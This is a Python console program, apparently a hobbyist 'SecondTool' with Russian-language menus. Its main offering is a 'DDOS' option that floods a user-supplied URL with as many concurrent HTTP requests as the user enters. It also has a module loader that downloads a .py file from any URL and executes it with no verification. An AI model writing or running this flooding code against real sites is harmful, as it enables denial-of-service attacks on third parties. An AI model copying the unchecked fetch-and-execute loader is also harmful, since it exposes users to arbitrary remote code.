from colorama import Fore, Style
from bin import config
import time, os, configparser, sys, sqlite3, importlib.util, requests, concurrent.futures, argparse

cnf = configparser.ConfigParser()
cnf.read('config.ini')
core_version = cnf["core"]["version"]
is_debug = cnf['core']['debug'].lower() == 'true'

def handler(command=None, message=None):
    if is_debug is False:
        return

    if command is not None and str(command).lower() == "init":
        print(f'{Fore.CYAN}[INFO]{Fore.GREEN} Обработчик инициализирован | handler{Style.RESET_ALL}')
    elif command is not None and message:
        command = str(command).lower()
        color_map = {
            'info': Fore.CYAN,
            'error': Fore.RED,
            'warning': Fore.YELLOW,
            'success': Fore.GREEN,
            'fatal error': Fore.RED
        }
        color = color_map.get(command, Fore.WHITE)
        print(f'{color}[{command.upper()}]{Fore.GREEN} {message}{Style.RESET_ALL}')
        if command == 'fatal error':
            exit(500)
    else:
        print(f'{Fore.MAGENTA}[INFO] Пустой вызов обработчика{Style.RESET_ALL}')
    
    time.sleep(1)

def clear(): 
    os.system('cls' if os.name == 'nt' else 'clear')
    handler('info', 'Очистка консоли')

def ddos(url, amount):
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = [executor.submit(requests.get, url) for _ in range(int(amount))]
        a = 1
        for future in concurrent.futures.as_completed(futures):
            print(Fore.BLUE + f"{a} - Ответ от {url}: {future.result().status_code}" + Fore.RESET)
            a+=1
    print(Fore.GREEN + 'DDOS окончен' + Fore.RESET)
    return time.sleep(4)

def download_lib(url, save_path, file_name):
    handler('info', 'Загрузка библиотеки')
    try:
        response = requests.get(url)
        if response.status_code == 200:
            os.makedirs(os.path.dirname(save_path), exist_ok=True)
            
            with open(save_path, 'wb') as file:
                file.write(response.content) 
            
            sql, cursor = config.init_database()
            cursor.execute("INSERT INTO libs (name, version) VALUES (?,?)",(file_name.split('.')[0], core_version))
            sql.commit()
            sql.close()

            print(Fore.GREEN + f"Модуль успешно загружен {save_path}" + Fore.RESET)
            exit(1)
        else:
            print(f"Ошибка при загрузке файла: {response.status_code}")
    except Exception as e:
        print(f"Произошла ошибка при запросе: {e}")

def start():
    clear()

    parser = argparse.ArgumentParser(description="Main script")
    parser.add_argument('--load', type=str, help='Загрузить библиотеку из ссылки', required=False)
    args = parser.parse_args()
    if args.load:
        file_name = os.path.basename(args.load)
        save_path = os.path.join('libs', file_name)
        download_lib(args.load, save_path, file_name)

    print(Fore.YELLOW + config.LOGO)
    print('SecondTool presents\nhttps://t.me/SecondToolChannel' + Fore.RESET)
    try: 
        a = int(input(Fore.CYAN + f'''
1.DDOS
2.MODULE`S
3.HELP
0.QUIT
>>> ''' + Fore.YELLOW))
    except ValueError:
        print(Fore.RED + 'FATAL ERROR' + Fore.RESET)
        time.sleep(3)
        clear()
        exit()
    
    if a == 0:
        handler('info', 'Завершение работы')
        exit(1)
    if a == 1:
        print(Fore.RED + 'ВНИМАНИЕ! Процесс DDOSa отменить будет невозможно!')
        url = input(Fore.CYAN + 'Введите ссылку>>> ' + Fore.YELLOW)
        amount = input(Fore.CYAN + 'Введите количество запросов>>> ' + Fore.YELLOW)
        ddos(url,amount)
        return start()
    elif a == 2:
        if config.LIBS_FOLDER not in sys.path:
            handler('info', 'Иницилизация библиотек')
            sys.path.append(config.LIBS_FOLDER)

        sql, cursor = config.init_database()
        cursor.execute("SELECT * FROM libs")
        libs = cursor.fetchall()
        commands_registry = {}
        module_commands = {}

        for lib in libs:
            lib_name = lib[1]
            lib_path = os.path.join(config.LIBS_FOLDER, f"{lib_name}.py")
            try:
                if not os.path.exists(lib_path):
                    continue
                spec = importlib.util.spec_from_file_location(lib_name, lib_path)
                module = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(module)
                if hasattr(module, "commands") and callable(module.commands):
                    commands = module.commands()
                    if isinstance(commands, dict):
                        commands_registry.update(commands)
                        module_commands[lib_name] = list(commands.keys())
            except Exception as e:
                print(Fore.RED + f"Ошибка с модулем {lib_name}: {e}")

        while True:
            print(Fore.GREEN + "Доступные команды:")
            for module, commands in module_commands.items():
                print(f"Модуль {module}: \n- {'\n- '.join(commands)}")
            print(Fore.YELLOW + 'delete [название модуля] - удалить модуль' + Fore.RESET)
            command = input(Fore.CYAN + 'Enter command>>> ' + Fore.YELLOW).strip()
            if command == "exit":
                print(Fore.GREEN + "Выход из программы.")
                break
            elif 'delete' in command:
                module_name = command.split(' ')[1]
                if module_name == 'base' or module_name == 'time':
                    print(Fore.RED + 'Невозможно удалить базовые модули, так как они используються программой!' + Fore.RESET)
                    time.sleep(2)
                    return restart()
                is_true = False
                for module, commands in module_commands.items():
                    if str(module) == str(module_name):
                        is_true = True
                if is_true is True:
                    sql, cursor = config.init_database()
                    cursor.execute("DELETE FROM libs WHERE name = ?",(module_name,))
                    sql.commit()
                    sql.close()
                    file_path = f'libs/{module_name}.py'
                    if os.path.exists(file_path):
                        os.remove(file_path)
                    print(Fore.GREEN + 'Модуль удален!' + Fore.RESET)
                    time.sleep(2)
                    return restart()
                else:
                    print(Fore.RED + 'Модуль не найден!' + Fore.RESET)
                    time.sleep(2)
                    return restart()
            if command in commands_registry:
                try:
                    commands_registry[command]()
                except Exception as e:
                    print(Fore.RED + f"Ошибка при выполнении команды {command}: {e}")
            else:
                print(Fore.RED + f"Команда '{command}' не найдена.")
    elif a == 3:
        print(Fore.CYAN + '''
Как устанавливать новые библиотеки?
- Для этого найдите библиотеку, скопируйте на неё ссылку(файл .py) и запустите скрипт с такими аргументами:
    python main.py --load [ссылка на библиотеку]
        ''' + Fore.RESET)
        ok = input(Fore.YELLOW + 'OK>>> ' + Fore.RESET)
        return restart()
    else:
        print(Fore.RED + 'Команда не найдена' + Fore.RESET)
        handler('error', 'Команда не найдена')
        sql.close()
        time.sleep(1)
        return restart()

def restart():
    return start()